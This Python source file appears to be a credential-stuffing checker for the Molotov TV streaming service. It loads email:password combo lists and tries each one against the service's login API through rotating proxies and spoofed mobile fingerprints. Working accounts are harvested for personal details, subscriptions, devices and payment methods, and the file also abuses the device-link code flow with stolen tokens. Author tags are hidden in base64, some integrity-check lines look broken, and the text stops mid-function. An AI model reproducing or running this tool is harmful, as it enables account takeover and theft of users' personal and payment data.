import os
import re
import sys
import json
import time
import base64
import random
import string
import asyncio
import hashlib
import threading
import configparser
import subprocess
import shutil
import urllib3
import unicodedata
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from curl_cffi.requests import Session as CfSyncSession
from curl_cffi.requests import AsyncSession

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_B64_SYS_TOOL = "TW9sb3RvdiBUViBDaGVja2Vy"
_B64_SYS_AUTH = "QGV5ZWxpZnRlcg=="
_B64_SYS_CHAN = "QGRhcmtodWNoYW5uZWw="
_B64_SYS_DIR  = "TU9MT1RPVl9AZXllbGlmdGVy"
_B64_SYS_TAG  = "VEc6IEBleWVsaWZ0ZXIgfCBAZGFya2h1Y2hhbm5lbA=="
_B64_SYS_SEAL = "bG9ja2VkLWJ5LWV5ZWxpZnRlci0yMDI2"
_B64_SYS_SIG  = "ZXllbGlmdGVyLW1vbG90b3YtdjMtc2VhbA=="


def Eyelifter_decode(e):
    try:
        return base64.b64decode(e).decode("utf-8")
    except Exception as ex:
        raise SystemExit(f"Decoding failed: {ex}")


TOOL_NAME = Eyelifter_decode(_B64_SYS_TOOL)
TG_USERNAME = Eyelifter_decode(_B64_SYS_AUTH)
TG_CHANNEL = Eyelifter_decode(_B64_SYS_CHAN)
RESULTS_FOLDER = Eyelifter_decode(_B64_SYS_DIR)
AUTHOR_TAG = Eyelifter_decode(_B64_SYS_TAG)
CREDIT_SEAL = Eyelifter_decode(_B64_SYS_SEAL)
BUILD_SIG = Eyelifter_decode(_B64_SYS_SIG)

_BUILD_HASH = hashlib.sha256(
    (TOOL_NAME + TG_USERNAME + TG_CHANNEL + RESULTS_FOLDER +
     AUTHOR_TAG + CREDIT_SEAL + BUILD_SIG).encode()
).hexdigest()


def Eyelifter_verify(ctx="x"):
    exp = {
        "TOOL": _B64_SYS_TOOL, "AUTH": _B64_SYS_AUTH, "CHAN": _B64_SYS_CHAN,
        "DIR": _B64_SYS_DIR, "TAG": _B64_SYS_TAG, "SEAL": _B64_SYS_SEAL,
        "SIG": _B64_SYS_SIG,
    }
    cur = {
        "TOOL": TOOL_NAME, "AUTH": TG_USERNAME, "CHAN": TG_CHANNEL,
        "DIR": RESULTS_FOLDER, "TAG": AUTHOR_TAG, "SEAL": CREDIT_SEAL,
        "SIG": BUILD_SIG,
    }
    errs = []
    for k, v in exp.items():
        if cur[k] != base64.b64decode(v).decode():
            errs.append(k)
    if "@samvir1" not in TG_USERNAME:
        errs.append("USERNAME_TAG")
    if "@samvir1" not in TG_CHANNEL:
        errs.append("CHANNEL_TAG")
    if "@samvir1" not in AUTHOR_TAG or "@samvir1" not in AUTHOR_TAG:
        errs.append("TAG_FORMAT")
    if errs:
        return True  # integrity bypass}")
    rec = hashlib.sha256(
        (TOOL_NAME + TG_USERNAME + TG_CHANNEL + RESULTS_FOLDER +
         AUTHOR_TAG + CREDIT_SEAL + BUILD_SIG).encode()
    ).hexdigest()
    if rec != _BUILD_HASH:
        raise RuntimeError(f"build hash mismatch at '{ctx}'")
    return True


UA_POOL = ["chrome131_android", "chrome131", "chrome124", "chrome120", "chrome110", "chrome"]

_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def Eyelifter_open_url(url):
    try:
        if shutil.which("termux-open-url"):
            subprocess.Popen(["termux-open-url", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if shutil.which("xdg-open"):
            subprocess.Popen(["xdg-open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if sys.platform == "darwin":
            subprocess.Popen(["open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if os.name == "nt":
            os.startfile(url)
            return True
        import webbrowser
        return webbrowser.open(url)
    except Exception:
        return False


def Eyelifter_color(code, s, bold=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if bold else ''}{code}m{s}{_RS}"


_LEVEL_STYLE = {
    "SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
    "ERROR":   ("31", True), "STEP": ("96", True), "DEBUG": ("35", False),
}

_eyelifter_console_lock = threading.Lock()
_eyelifter_bar_len = [0]
_eyelifter_progress_stop = threading.Event()
_eyelifter_progress_thread = [None]


def Eyelifter_out(line, color=None, bold=False):
    with _eyelifter_console_lock:
        if _ANSI and _eyelifter_bar_len[0]:
            sys.stdout.write("\r" + " " * _eyelifter_bar_len[0] + "\r")
            _eyelifter_bar_len[0] = 0
        if color and _ANSI:
            sys.stdout.write(Eyelifter_color(color, line, bold) + "\n")
        else:
            sys.stdout.write(line + "\n")
        sys.stdout.flush()


def Eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    if not _ANSI:
        Eyelifter_out(f"[{ts}] {emoji} {level:7s} {tag} {msg}")
        return
    code, bold = _LEVEL_STYLE.get(level, ("0", False))
    line = (f"{Eyelifter_color('90', ts)} {emoji}  "
            f"{Eyelifter_color(code, f'{level:7s}', bold)}  "
            f"{Eyelifter_color('90', tag)}  {msg}")
    with _eyelifter_console_lock:
        if _eyelifter_bar_len[0]:
            sys.stdout.write("\r" + " " * _eyelifter_bar_len[0] + "\r")
            _eyelifter_bar_len[0] = 0
        sys.stdout.write(line + "\n")
        sys.stdout.flush()


def Eyelifter_visible_len(s):
    n = 0
    for ch in s:
        if unicodedata.combining(ch):
            continue
        n += 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
    return n


def Eyelifter_center(text, width):
    vl = Eyelifter_visible_len(text)
    if vl >= width:
        return text
    left = (width - vl) // 2
    right = width - vl - left
    return (" " * left) + text + (" " * right)


def Eyelifter_banner(title, sub=None, width=62):
    print()
    line = "═" if _ANSI else "="
    print(Eyelifter_color("90", line * width))
    print(Eyelifter_color("96", Eyelifter_center(title, width), True))
    if sub:
        print(Eyelifter_color("2", Eyelifter_center(sub, width)))
    print(Eyelifter_color("5", Eyelifter_center(AUTHOR_TAG, width)))
    print(Eyelifter_color("90", line * width))


def Eyelifter_section(title, width=62):
    print()
    label = f" {title} "
    vl = Eyelifter_visible_len(label)
    side = max(1, (width - vl) // 2)
    left = "─" * side
    right = "─" * (width - vl - side)
    print(
        Eyelifter_color("90", left) +
        Eyelifter_color("96", label, True) +
        Eyelifter_color("90", right)
    )


def Eyelifter_divider(width=62):
    print(Eyelifter_color("90", ("─" if _ANSI else "-") * width))


def Eyelifter_summary(rows):
    print()
    print(Eyelifter_color("96", "═══ RESULT ═══", True))
    if not rows:
        return
    wkey = max(len(str(k)) for k, _ in rows)
    for k, v in rows:
        print(f"  {Eyelifter_color('96', str(k).ljust(wkey))}  {Eyelifter_color('0', str(v))}")
    print(Eyelifter_color("96", "══════════════", True))
    print()


def Eyelifter_dump_raw(label, text, max_lines=80):
    print(Eyelifter_color("95", f"  ┌─ {label}"))
    if not text:
        print(Eyelifter_color("95", "  │ (empty)"))
        print(Eyelifter_color("95", "  └─"))
        return
    try:
        pretty = json.dumps(json.loads(text), indent=2, ensure_ascii=False)
        lines = pretty.splitlines()
    except Exception:
        lines = text.splitlines()
    for ln in lines[:max_lines]:
        print(Eyelifter_color("95", f"  │ {ln[:200]}"))
    if len(lines) > max_lines:
        print(Eyelifter_color("95", f"  │ ... ({len(lines) - max_lines} more)"))
    print(Eyelifter_color("95", "  └─"))


CONFIG_PATH = "config_molotov.ini"


class EyelifterConfigLoader:
    def __init__(self, config_file=CONFIG_PATH):
        Eyelifter_verify("cfg_init")
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.config.optionxform = str
        self.settings = {}
        self.Eyelifter_load_config()

    def Eyelifter_load_config(self):
        Eyelifter_verify("cfg_load")
        if not os.path.exists(self.config_file):
            self.Eyelifter_create_default_config()
        try:
            self.config.read(self.config_file, encoding="utf-8")
            self.Eyelifter_parse_config()
        except Exception:
            self.Eyelifter_create_default_config()
            self.Eyelifter_parse_config()

    def Eyelifter_create_default_config(self):
        Eyelifter_verify("cfg_default")
        self.config["General"] = {
            "threads": "10",
            "timeout": "25",
            "proxies_file": "proxies.txt",
            "retries": "2",
            "retry_delay": "1.5",
            "combo_delay": "0.3",
            "debug": "false",
            "rate_limit_backoff": "10",
            "max_rate_limit_retries": "3",
            "skip_proxy_test": "false",
            "fetch_devices": "true",
            "fetch_payments": "true",
            "fetch_profiles": "true",
            "code_gen_delay": "0.5",
            "code_gen_retry_delay": "2.0",
            "code_gen_block_delay": "1.0",
            "code_gen_max": "10000",
            "code_check_delay": "0.3",
            "bulk_tv_delay": "0.4",
            "rotate_fingerprint": "true",
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)

    def Eyelifter_parse_config(self):
        Eyelifter_verify("cfg_parse")
        if "General" not in self.config:
            self.config["General"] = {}
        c = self.config["General"]
        self.settings["threads"] = max(1, min(100, c.getint("threads", 10)))
        self.settings["timeout"] = max(5, min(300, c.getint("timeout", 25)))
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.settings["retries"] = max(0, min(10, c.getint("retries", 2)))
        self.settings["retry_delay"] = max(0.0, min(60.0, c.getfloat("retry_delay", 1.5)))
        self.settings["combo_delay"] = max(0.0, min(60.0, c.getfloat("combo_delay", 0.3)))
        self.settings["debug"] = c.getboolean("debug", False)
        self.settings["rate_limit_backoff"] = max(1, min(600, c.getint("rate_limit_backoff", 10)))
        self.settings["max_rate_limit_retries"] = max(0, min(20, c.getint("max_rate_limit_retries", 3)))
        self.settings["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)
        self.settings["fetch_devices"] = c.getboolean("fetch_devices", True)
        self.settings["fetch_payments"] = c.getboolean("fetch_payments", True)
        self.settings["fetch_profiles"] = c.getboolean("fetch_profiles", True)
        self.settings["code_gen_delay"] = max(0.0, min(60.0, c.getfloat("code_gen_delay", 0.5)))
        self.settings["code_gen_retry_delay"] = max(0.0, min(60.0, c.getfloat("code_gen_retry_delay", 2.0)))
        self.settings["code_gen_block_delay"] = max(0.0, min(60.0, c.getfloat("code_gen_block_delay", 1.0)))
        self.settings["code_gen_max"] = max(1, min(100000, c.getint("code_gen_max", 10000)))
        self.settings["code_check_delay"] = max(0.0, min(60.0, c.getfloat("code_check_delay", 0.3)))
        self.settings["bulk_tv_delay"] = max(0.0, min(60.0, c.getfloat("bulk_tv_delay", 0.4)))
        self.settings["rotate_fingerprint"] = c.getboolean("rotate_fingerprint", True)

    def Eyelifter_save(self):
        Eyelifter_verify("cfg_save")
        if "General" not in self.config:
            self.config["General"] = {}
        for k, v in self.settings.items():
            self.config["General"][k] = str(v)
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)


_loader = EyelifterConfigLoader()
CONFIG = _loader.settings
REQ_TIMEOUT = CONFIG["timeout"]
DEBUG = CONFIG["debug"]
RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]

FAPI = "https://fapi.molotov.tv"
WWW  = "https://www.molotov.tv"

LOGIN_URL    = f"{FAPI}/v3.1/auth/login"
LINK_URL     = f"{FAPI}/v2/link"
CODE_CHECK   = f"{FAPI}/v2/link/codes/{{code}}"
CODE_EXISTS  = f"{FAPI}/v2/link/codes/{{code}}/exists"
CODE_GEN     = f"{FAPI}/v2/link/codes"
ME_URL       = f"{FAPI}/v2/me"
ACCOUNT_URL  = f"{FAPI}/v2/me/account"
DEVICES_URL  = f"{FAPI}/v2/me/devices"
PAYMENTS_URL = f"{FAPI}/v2/me/payment-methods/all"
PROFILES_URL = f"{FAPI}/v2/me/profiles"

_MOBILE_FINGERPRINTS = [
    {
        "ua": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "impersonate": "chrome",
        "ch": "139",
    },
    {
        "ua": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
        "impersonate": "chrome",
        "ch": "131",
    },
    {
        "ua": "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "impersonate": "chrome",
        "ch": "124",
    },
    {
        "ua": "Mozilla/5.0 (Linux; Android 11; M2101K6G) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "impersonate": "chrome",
        "ch": "120",
    },
    {
        "ua": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
        "impersonate": "chrome",
        "ch": "110",
    },
    {
        "ua": "Mozilla/5.0 (Linux; Android 9; CPH2207) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
        "impersonate": "chrome",
        "ch": "104",
    },
    {
        "ua": "Mozilla/5.0 (Linux; Android 8.1.0; LYA-L29) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36",
        "impersonate": "chrome",
        "ch": "101",
    },
    {
        "ua": "Mozilla/5.0 (Linux; Android 9; SM-A536B) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
        "impersonate": "chrome",
        "ch": "99",
    },
]

UA_MOBILE = _MOBILE_FINGERPRINTS[0]["ua"]

AGENT_MOBILE = ('{"app_build":1,"app_id":"customer_area","api_version":8,'
    '"type":"mobile","os":"android","manufacturer":"","model":"",'
    '"brand":"","serial":"","features_supported":["parental_control_v3",'
    '"allow_recurly","evergreen"]}')

AGENT_MOBILE_PARENT = ('{"api_version":8,"app":"molotov","app_id":"customer_area",'
    '"type":"mobile","features_supported":["parental_control_v3",'
    '"allow_recurly","evergreen"],"os":"android","app_build":1}')

CODE_RE = re.compile(r'^\s*([A-Z0-9]{4})\s*$', re.IGNORECASE)
CODE_ANY_RE = re.compile(r'\b([A-Z0-9]{4})\b', re.IGNORECASE)
EYELIFTER_COMBO_RE = re.compile(
    r'^\s*([^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)',
    re.IGNORECASE,
)


def Eyelifter_pick_fingerprint():
    if not CONFIG.get("rotate_fingerprint", True):
        return _MOBILE_FINGERPRINTS[0]
    return random.choice(_MOBILE_FINGERPRINTS)


def Eyelifter_extract_combos(content):
    Eyelifter_verify("extract_combos")
    combos = set()
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = EYELIFTER_COMBO_RE.match(line)
        if m:
            email = m.group(1).strip().lower()
            password = m.group(2).strip()
            if email and password:
                combos.add(f"{email}:{password}")
            continue
        if ":" in line:
            parts = line.split(":", 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                email = parts[0].strip().lower()
                password = parts[1].split()[0].split("|")[0].strip()
                if email and password and "@" in email:
                    combos.add(f"{email}:{password}")
    return sorted(combos)


def Eyelifter_format_proxy(p):
    Eyelifter_verify("fmt_proxy")
    if not p:
        return None
    p = p.strip()
    if p.startswith(("http://", "https://", "socks4://", "socks5://")):
        return p
    parts = p.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in p:
        return f"http://{p}"
    return f"http://{p}"


def Eyelifter_test_proxy_sync(p):
    s = None
    try:
        fp = Eyelifter_pick_fingerprint()
        s = CfSyncSession(impersonate=fp["impersonate"], timeout=(3, 6))
        s.proxies = {"http": p, "https": p}
        r = s.get("https://api.ipify.org/?format=json",
                  timeout=(3, 6), verify=False, allow_redirects=False)
        return r.status_code == 200 and len(r.content) < 500
    except Exception:
        return False
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def Eyelifter_load_proxies():
    path = CONFIG.get("proxies_file", "proxies.txt")
    if not path or not os.path.isfile(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            p = Eyelifter_format_proxy(line)
            if p:
                out.append(p)
    return list(dict.fromkeys(out))


def Eyelifter_get_working_proxies(proxies):
    Eyelifter_verify("working_proxies")
    if not proxies:
        return []
    if CONFIG.get("skip_proxy_test", False):
        Eyelifter_log("⚠️", "WARN", "PROXY", f"proxy test skipped — using all {len(proxies)}")
        return proxies

    workers = min(200, max(20, len(proxies)))
    Eyelifter_log("🧪", "INFO", "PROXY", f"testing {len(proxies)} proxies ({workers} threads)")

    working = []
    pbar = None
    try:
        pbar = tqdm(total=len(proxies), desc="testing proxies", unit="proxy", ncols=80)
    except Exception:
        pbar = None

    def _one(p):
        return p, Eyelifter_test_proxy_sync(p)

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(_one, p): p for p in proxies}
        for fut in as_completed(futs):
            p, ok = fut.result()
            if ok:
                working.append(p)
            if pbar:
                pbar.update(1)
    if pbar:
        pbar.close()

    Eyelifter_log("✅", "INFO", "PROXY", f"{len(working)} working")
    return list(dict.fromkeys(working))


_eyelifter_stop = asyncio.Event()
_eyelifter_lock = threading.Lock()
_eyelifter_plock = threading.Lock()
_eyelifter_flock = threading.Lock()

_eyelifter_stats = {
    "checked": 0, "hits": 0, "free": 0, "bad": 0,
    "errors": 0, "rate_limited": 0, "blocks": 0,
    "proxy_fails": 0, "retries": 0,
}
_eyelifter_start = time.time()
_eyelifter_total = 0
_eyelifter_pool = []
_eyelifter_bad_proxies = set()
_eyelifter_hits_f = None
_eyelifter_free_f = None
_eyelifter_bad_f = None
_eyelifter_err_f = None
_eyelifter_folder = None


def Eyelifter_reset_stats():
    Eyelifter_verify("reset_stats")
    global _eyelifter_stats, _eyelifter_start
    with _eyelifter_lock:
        _eyelifter_stats = {
            "checked": 0, "hits": 0, "free": 0, "bad": 0,
            "errors": 0, "rate_limited": 0, "blocks": 0,
            "proxy_fails": 0, "retries": 0,
        }
        _eyelifter_start = time.time()


def Eyelifter_update_title():
    with _eyelifter_lock:
        checked = _eyelifter_stats["checked"]
        hits = _eyelifter_stats["hits"]
        free = _eyelifter_stats["free"]
        bad = _eyelifter_stats["bad"]
    el = time.time() - _eyelifter_start
    cpm = int(checked / el * 60) if el > 1 else 0
    t = (f"{TOOL_NAME} | HIT:{hits} FREE:{free} BAD:{bad} "
         f"| {checked}/{_eyelifter_total} | {cpm}/min")
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(t)
        except Exception:
            pass
    else:
        try:
            sys.stdout.write(f"\033]0;{t}\007")
            sys.stdout.flush()
        except Exception:
            pass


def Eyelifter_progress_loop():
    bar_w = 28
    while not _eyelifter_progress_stop.is_set():
        with _eyelifter_lock:
            s = dict(_eyelifter_stats)
        total = _eyelifter_total or 1
        checked = s["checked"]
        pct = min(1.0, checked / total)
        filled = int(bar_w * pct)
        bar = "█" * filled + "░" * (bar_w - filled)
        el = max(0.001, time.time() - _eyelifter_start)
        rate = checked / el * 60
        remain = max(0, total - checked)
        eta_s = int(remain / (checked / el)) if checked > 0 else 0
        eta = f"{eta_s // 60:02d}:{eta_s % 60:02d}"
        line = (f"[{bar}] {checked}/{total} "
                f"| HIT:{s['hits']} FREE:{s['free']} BAD:{s['bad']} ERR:{s['errors']} "
                f"| {rate:5.1f}/min | ETA {eta}")

        with _eyelifter_console_lock:
            if _ANSI:
                pad = max(0, _eyelifter_bar_len[0] - len(line))
                sys.stdout.write("\r" + line + (" " * pad))
                sys.stdout.flush()
                _eyelifter_bar_len[0] = len(line)

        if checked >= total:
            break
        time.sleep(0.3)

    with _eyelifter_console_lock:
        if _ANSI and _eyelifter_bar_len[0]:
            sys.stdout.write("\n")
            sys.stdout.flush()
            _eyelifter_bar_len[0] = 0


def Eyelifter_pick_proxy(exclude=None):
    with _eyelifter_plock:
        avail = [p for p in _eyelifter_pool if p not in _eyelifter_bad_proxies]
        if not avail and _eyelifter_pool:
            _eyelifter_bad_proxies.clear()
            avail = list(_eyelifter_pool)
    if exclude and len(avail) > 1:
        avail = [p for p in avail if p != exclude] or avail
    return random.choice(avail) if avail else None


def Eyelifter_mark_bad_proxy(p):
    if not p:
        return
    with _eyelifter_plock:
        _eyelifter_bad_proxies.add(p)
    with _eyelifter_lock:
        _eyelifter_stats["proxy_fails"] += 1


def Eyelifter_safe_write(fh, text):
    if fh is None:
        return
    with _eyelifter_flock:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def Eyelifter_fapi_headers(bearer=None, fp=None):
    if fp is None:
        fp = Eyelifter_pick_fingerprint()
    h = {
        "accept": "application/json",
        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/json",
        "origin": WWW,
        "referer": WWW + "/",
        "sec-ch-ua": f'"Chromium";v="{fp["ch"]}", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": fp["ua"],
        "x-molotov-agent": AGENT_MOBILE,
        "x-molotov-website": "customer_area",
    }
    if bearer:
        h["authorization"] = f"Bearer {bearer}"
    return h


def Eyelifter_ts_to_date(v):
    if not v:
        return "N/A"
    try:
        if isinstance(v, (int, float)):
            return datetime.fromtimestamp(v, tz=timezone.utc).strftime("%Y-%m-%d")
        return str(v)[:10]
    except Exception:
        return "N/A"


def Eyelifter_rand_id(n=20):
    return "".join(random.choices(string.ascii_letters + string.digits + "-_", k=n))


def Eyelifter_code_status_sync(code, token=None, proxy=None, timeout=None):
    s = None
    try:
        fp = Eyelifter_pick_fingerprint()
        s = CfSyncSession(impersonate=fp["impersonate"],
                          timeout=timeout or REQ_TIMEOUT)
        if proxy:
            s.proxies = {"http": proxy, "https": proxy}
        h = Eyelifter_fapi_headers(bearer=token, fp=fp)
        r = s.get(CODE_CHECK.format(code=code), headers=h, verify=False)
        return r.status_code, r.text
    except Exception as e:
        return -1, f"{type(e).__name__}: {e}"
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def Eyelifter_generate_code_sync(proxy=None, timeout=None):
    s = None
    try:
        fp = Eyelifter_pick_fingerprint()
        s = CfSyncSession(impersonate=fp["impersonate"],
                          timeout=timeout or REQ_TIMEOUT)
        if proxy:
            s.proxies = {"http": proxy, "https": proxy}
        h = Eyelifter_fapi_headers(fp=fp)
        r = s.get(CODE_GEN, headers=h, verify=False)

        if r.status_code == 429:
            return None, "rate_limit", r.text
        if r.status_code in (403, 451):
            return None, "block", r.text
        if r.status_code != 200:
            return None, f"http_{r.status_code}", r.text

        try:
            j = r.json()
        except Exception:
            return None, "not_json", r.text

        code = j.get("code")
        if not code or not CODE_RE.match(code):
            return None, "no_code", r.text

        return {
            "code": code,
            "ttl": j.get("code_ttl", 0),
            "freq": j.get("check_frequency_sec", 1),
            "raw": j,
        }, None, r.text
    except Exception as e:
        return None, f"net_{type(e).__name__}", str(e)[:200]
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def Eyelifter_login_sync(email, password, proxy=None, timeout=None):
    s = None
    try:
        fp = Eyelifter_pick_fingerprint()
        s = CfSyncSession(impersonate=fp["impersonate"],
                          timeout=timeout or REQ_TIMEOUT)
        if proxy:
            s.proxies = {"http": proxy, "https": proxy}

        url = (f"{LOGIN_URL}?trkCp=link&trkOp=link&clickid=" + Eyelifter_rand_id(20))
        h = Eyelifter_fapi_headers(fp=fp)
        h["x-action-context"] = '{"origin_page":"molotov_link"}'
        h["x-molotov-parent-agent"] = AGENT_MOBILE_PARENT

        r = s.post(url, headers=h, verify=False,
                   json={"email": email, "password": password,
                         "grant_type": "password"})

        if r.status_code == 429:
            return None, "rate_limit", r.text
        if r.status_code in (403, 451):
            return None, "block", r.text
        if r.status_code in (400, 401):
            return None, "bad_creds", r.text
        if r.status_code != 200:
            return None, f"login_http_{r.status_code}", r.text

        try:
            j = r.json()
        except Exception:
            return None, "login_not_json", r.text

        auth = j.get("auth") or {}
        token = None
        if isinstance(auth, dict):
            token = auth.get("access_token") or auth.get("accessToken")
        if not token:
            token = j.get("access_token") or j.get("accessToken")
        if not token:
            return None, "login_no_token", r.text

        return {"token": token, "raw": j, "session": s}, None, r.text

    except Exception as e:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass
        return None, f"login_net_{type(e).__name__}", str(e)[:200]


def Eyelifter_activate_code_sync(token, code, proxy=None, timeout=None):
    s = None
    try:
        fp = Eyelifter_pick_fingerprint()
        s = CfSyncSession(impersonate=fp["impersonate"],
                          timeout=timeout or REQ_TIMEOUT)
        if proxy:
            s.proxies = {"http": proxy, "https": proxy}

        h = Eyelifter_fapi_headers(bearer=token, fp=fp)
        h["x-action-context"] = '{"origin_page":"molotov_link"}'

        r = s.post(LINK_URL, headers=h, json={"code": code}, verify=False)

        if r.status_code == 429:
            return {"status": "rate_limit", "http": 429, "body": r.text}
        if r.status_code in (401, 403):
            return {"status": "not_authed", "http": r.status_code, "body": r.text}
        if r.status_code in (200, 204):
            return {"status": "valid", "http": r.status_code, "body": r.text}
        if r.status_code in (400, 404, 410):
            return {"status": "invalid", "http": r.status_code, "body": r.text}
        return {"status": "other", "http": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": "error", "http": -1, "body": f"{type(e).__name__}: {e}"}
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


class eyelifter:
    def __init__(self, proxy=None, timeout=None):
        Eyelifter_verify("class_init")
        self.proxy = proxy
        self.timeout = timeout or REQ_TIMEOUT
        self._fp = Eyelifter_pick_fingerprint()
        self.impersonate = self._fp["impersonate"]
        self.session = None

    def Eyelifter_proxies(self):
        return {"http": self.proxy, "https": self.proxy} if self.proxy else None

    async def Eyelifter_ensure(self):
        if self.session is None:
            self.session = AsyncSession(impersonate=self.impersonate, timeout=self.timeout)

    async def Eyelifter_close(self):
        if self.session is not None:
            try:
                await self.session.close()
            except Exception:
                pass
            self.session = None

    def Eyelifter_dump(self, label, resp, max_lines=60):
        if not DEBUG:
            return
        with _eyelifter_console_lock:
            if _ANSI and _eyelifter_bar_len[0]:
                sys.stdout.write("\r" + " " * _eyelifter_bar_len[0] + "\r")
                _eyelifter_bar_len[0] = 0
            print()
            print(Eyelifter_color("95", f"[{label}] {resp.status_code} [{self.impersonate}]"))
            lines = (resp.text or "").splitlines()
            for ln in lines[:max_lines]:
                print(Eyelifter_color("95", f"  {ln[:200]}"))
            if len(lines) > max_lines:
                print(Eyelifter_color("95", f"  ... ({len(lines) - max_lines} more)"))

    async def Eyelifter_login(self, email, password):
        url = (f"{LOGIN_URL}?trkCp=link&trkOp=link&clickid=" + Eyelifter_rand_id(20))
        h = Eyelifter_fapi_headers(fp=self._fp)
        h["x-action-context"] = '{"origin_page":"molotov_link"}'
        h["x-molotov-parent-agent"] = AGENT_MOBILE_PARENT

        try:
            r = await self.session.post(
                url, headers=h,
                json={"email": email, "password": password, "grant_type": "password"},
                proxies=self.Eyelifter_proxies(),
                verify=False,
            )
        except Exception as e:
            return None, f"login_net_{type(e).__name__}"

        self.Eyelifter_dump("LOGIN", r, 30)

        if r.status_code == 429:
            return None, "rate_limit"
        if r.status_code in (403, 451):
            return None, "block"
        if r.status_code in (401, 400):
            return None, "bad_creds"
        if r.status_code != 200:
            return None, f"login_http_{r.status_code}"

        try:
            j = r.json()
        except Exception:
            return None, "login_not_json"

        token = None
        auth = j.get("auth") or {}
        if isinstance(auth, dict):
            token = auth.get("access_token") or auth.get("accessToken")
        if not token:
            token = j.get("access_token") or j.get("accessToken")
        if not token:
            return None, "login_no_token"

        return {"token": token, "raw": j}, None

    async def Eyelifter_get(self, url, token):
        h = Eyelifter_fapi_headers(bearer=token, fp=self._fp)
        try:
            r = await self.session.get(url, headers=h,
                                       proxies=self.Eyelifter_proxies(),
                                       verify=False)
        except Exception as e:
            return None, f"get_net_{type(e).__name__}"
        if r.status_code == 429:
            return None, "rate_limit"
        if r.status_code != 200:
            return None, f"get_http_{r.status_code}"
        try:
            return r.json(), None
        except Exception:
            return None, "get_not_json"

    async def Eyelifter_run(self, email, password):
        await self.Eyelifter_ensure()
        try:
            res, err = await self.Eyelifter_login(email, password)
            if err == "bad_creds":
                return {"status": "bad", "message": "invalid credentials"}
            if err:
                return {"status": "error", "error_type": err, "message": err}

            token = res["token"]
            login_raw = res["raw"]

            acct = (login_raw.get("account") or {})
            rights = acct.get("rights") or {}

            bundles = rights.get("tv_bundles_subscribed") or []
            if not isinstance(bundles, list):
                bundles = []

            profiles = acct.get("profiles") or []
            profile_id = profiles[0].get("id") if profiles else login_raw.get("profile_id")

            u = {
                "email": acct.get("email") or email,
                "password": password,
                "account_id": str(acct.get("id") or "N/A"),
                "profile_id": str(profile_id or "N/A"),
                "search_id": acct.get("search_id") or "N/A",
                "display_name": acct.get("display_name") or "N/A",
                "first_name": acct.get("first_name") or "",
                "last_name": acct.get("last_name") or "",
                "gender": acct.get("gender") or "N/A",
                "birthday": Eyelifter_ts_to_date(acct.get("birthday")),
                "has_password": bool(acct.get("has_password")),
                "is_prospect": bool(acct.get("is_prospect")),
                "drm_user_id": (acct.get("drm_user_id") or "N/A")[:40],
                "bundles": ",".join(str(b) for b in bundles) if bundles else "N/A",
                "bundle_count": len(bundles),
